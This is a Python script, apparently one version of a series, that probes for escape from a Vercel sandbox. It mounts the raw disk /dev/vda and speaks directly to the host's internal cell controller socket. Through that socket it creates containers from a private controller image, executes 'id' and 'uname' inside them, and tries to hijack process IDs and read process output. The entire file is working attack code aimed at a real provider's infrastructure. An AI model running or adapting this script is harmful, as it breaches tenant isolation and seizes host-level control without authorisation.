# -*- coding: utf-8 -*-
"""vda20_exec_json: Exec(json, 无 shutdown) + 保活矩阵 + ProcessService/Start 自定 id
P1: Create 保活变体矩阵 (command 变体, Start 带 command) -> Wait 判断存活
P2: 每个容器 Exec application/json (无 shutdown, 长超时) 拿 processId
P3: ProcessService/Start 客户端自定 process_id (4 变体) 挖字段
P4: Process StreamOutput 拿输出
输出落盘 + 哨兵 V20G_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v20g.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1200].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def env_proto(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: Create 保活矩阵
    log('=== P1 create keepalive matrix ===')
    variants = [
        ('cmd-sleep300', '{"image":"%s","command":"/bin/sleep 300"}'),
        ('cmd-shell', '{"image":"%s","command":"/bin/sh -c \'sleep 300\'"}'),
        ('cmd-tailf', '{"image":"%s","command":"tail -f /dev/null"}'),
        ('cmd-env', '{"image":"%s","command":"/bin/sleep 300","env":{"FOO":"bar"}}'),
        ('cmd-wd', '{"image":"%s","command":"/bin/sleep 300","workdir":"/"}'),
    ]
    ctrs = []
    for tag, tmpl in variants:
        body = tmpl % IMG
        st, bd = rpc_raw(sp, CSVC + '/Create', body, 'application/json', t=30)
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if m:
            cid = m.group(1)
            log('create %-12s -> 200 CID=%s' % (tag, cid))
            ctrs.append((tag, cid))
            st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=8)
            log('  start -> %s | %s' % (st, bd[:150]))
            st, bd = rpc_raw(sp, CSVC + '/Wait', '{"container_id":"%s"}' % cid, 'application/json', t=3)
            log('  wait  -> %s | %s  [%s]' % (st, bd[:150], 'ALIVE' if st == 'NORESP' else 'EXITED'))
        else:
            log('create %-12s -> %s | %s' % (tag, st, bd[:200]))
        time.sleep(0.3)

    # P2: Exec json (无 shutdown) 每个容器
    log('=== P2 Exec json no-shutdown ===')
    for tag, cid in ctrs:
        for cmd in ['id', '/bin/sh -c id;uname -a']:
            body = '{"container_id":"%s","command":"%s"}' % (cid, cmd)
            st, bd = rpc_raw(sp, CSVC + '/Exec', body, 'application/json', t=8)
            log('exec %s [%s] -> %s | %s' % (tag, cmd[:18], st, bd[:300].replace('\n', ' ')))
            time.sleep(0.3)

    # P3: ProcessService/Start 客户端自定 process_id
    log('=== P3 ProcessService/Start custom id ===')
    pid = 'hvcp_' + 'b' * 27
    for tag, body in [
        ('pid+command', '{"process_id":"%s","command":"id"}' % pid),
        ('pid+argv', '{"process_id":"%s","argv":["id"]}' % pid),
        ('pid+cmd', '{"process_id":"%s","cmd":["id"]}' % pid),
        ('pid-only', '{"process_id":"%s"}' % pid),
        ('pid+env', '{"process_id":"%s","command":"id","env":{"A":"1"}}' % pid),
    ]:
        st, bd = rpc_raw(sp, PSVC + '/Start', body, 'application/json', t=10)
        log('pstart %-12s -> %s | %s' % (tag, st, bd[:300].replace('\n', ' ')))
        if st.startswith('HTTP/1.1 200'):
            log('  PSTART_OK pid=%s' % pid)
        time.sleep(0.4)

    # P4: Process StreamOutput (若 P3 有 200)
    log('=== P4 Process StreamOutput ===')
    for tag, p in [('b27', pid), ('a27', 'hvcp_' + 'a' * 27)]:
        payload = pstr(1, p) + pbool(2, True)
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', env_proto(payload), 'application/connect+proto', t=5, shutdown_wr=True)
        log('stream %s -> %s | %s' % (tag, st, bd[:300].replace('\n', ' ')))
        time.sleep(0.3)

    # P5: 清理容器
    for tag, cid in ctrs:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=4)
        log('kill %s -> %s | %s' % (tag, st, bd[:120]))

    log('V20G_DONE')
    f.close()


if __name__ == '__main__':
    main()
